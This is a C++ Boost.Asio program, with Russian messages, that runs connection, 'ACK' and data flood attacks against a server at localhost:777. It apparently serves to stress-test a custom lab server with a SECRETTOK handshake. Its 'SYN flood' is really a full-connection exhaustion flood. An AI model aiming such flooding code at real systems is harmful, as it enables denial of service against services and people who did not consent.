#include <boost/asio.hpp>
#include <chrono>
#include <iostream>
#include <thread>
#include <vector>
#include <algorithm>
#include <array>

using boost::asio::ip::tcp;

void generic_attack(const std::string& host, const std::string& port, int num_connections, const std::string& type)
{
    try
    {
        boost::asio::io_context io_context;
        tcp::resolver resolver(io_context);
        tcp::resolver::results_type endpoints = resolver.resolve(host, port);

        if (type == "syn")
        {
            std::vector<std::unique_ptr<tcp::socket>> sockets;

            for (int i = 0; i < num_connections; ++i)
            {
                auto socket = std::make_unique<tcp::socket>(io_context);
                boost::asio::connect(*socket, endpoints);
                std::cout << "[SYN Flood " << i << "] Соединение установлено, но не завершено.\n";
                sockets.push_back(std::move(socket));
                std::this_thread::sleep_for(std::chrono::milliseconds(10));
            }

            std::this_thread::sleep_for(std::chrono::seconds(10));

            for (auto& socket : sockets)
            {
                if (socket->is_open())
                {
                    socket->close();
                }
            }

            std::cout << "SYN Flood атака завершена.\n";
        }
        else if (type == "ack")
        {
            tcp::socket socket(io_context);
            boost::asio::connect(socket, endpoints);

            char data[1024];
            try
            {
                size_t length = socket.read_some(boost::asio::buffer(data));
                std::cout << "[ACK Flood] Получено: " << std::string(data, length) << "\n";

                for (int i = 0; i < 100; ++i)
                {
                    boost::asio::write(socket, boost::asio::buffer("ACK\n"));
                    std::this_thread::sleep_for(std::chrono::milliseconds(100));
                    try
                    {
                        length = socket.read_some(boost::asio::buffer(data));
                        std::cout << "[ACK Flood] Получено: " << std::string(data, length) << "\n";
                    }
                    catch (const std::exception& e)
                    {
                        std::cerr << "[ACK Flood] Ошибка при чтении: " << e.what() << "\n";
                    }
                }
            }
            catch (const std::exception& e)
            {
                std::cerr << "[ACK Flood] Ошибка при первом чтении: " << e.what() << "\n";
            }

            socket.close();
        }
        else if (type == "data")
        {
            tcp::socket socket(io_context);
            boost::asio::connect(socket, endpoints);

            std::string data;
            boost::asio::read_until(socket, boost::asio::dynamic_buffer(data), '\n');
            std::cout << "Получено: " << data;

            if (data.find("SECRETTOK") != std::string::npos) {
                std::string token = data.substr(10, 6);
                std::string response = "RESPONSE " + token + "\n";
                boost::asio::write(socket, boost::asio::buffer(response));
                data.clear();
                boost::asio::read_until(socket, boost::asio::dynamic_buffer(data), '\n');
                std::cout << "Результат рукопожатия: " << data;
            } else {
                std::cerr << "Не получен SECRETTOK от сервера.\n";
                return;
            }


            std::string flood_data(1024, 'A');
            for (int i = 0; i < 1000; ++i) {
                try {
                    boost::asio::write(socket, boost::asio::buffer(flood_data));
                    std::cout << "[Data Flood " << i << "] Отправлено 1024 байта.\n";
                } catch (const std::exception& e) {
                    std::cerr << "[Data Flood] Ошибка при отправке: " << e.what() << "\n";
                    break;
                }
                std::this_thread::sleep_for(std::chrono::milliseconds(10));
            }

            socket.close();
            std::cout << "Data Flood атака завершена.\n";
        }
        else
        {
            std::cerr << "Неизвестный тип атаки: " << type << "\n";
        }
    }
    catch (std::exception& e)
    {
        std::cerr << "[" << type << " Attack] Ошибка: " << e.what() << "\n";
    }
}

int main(int argc, char* argv[])
{
    const std::string host = "localhost";
    const std::string port = "777";

    if (argc != 2)
    {
        std::cerr << "Использование: attack <type>\n";
        return 1;
    }

    std::string type = argv[1];

    const std::array<std::string, 3> valid_types = {"syn", "ack", "data"};
    if (std::find(valid_types.begin(), valid_types.end(), type) != valid_types.end())
    {
        int num_connections = (type == "syn") ? 1000 : 1;
        generic_attack(host, port, num_connections, type);
    }
    else
    {
        std::cerr << "Неизвестный тип атаки: " << type << "\n";
    }

    return 0;
}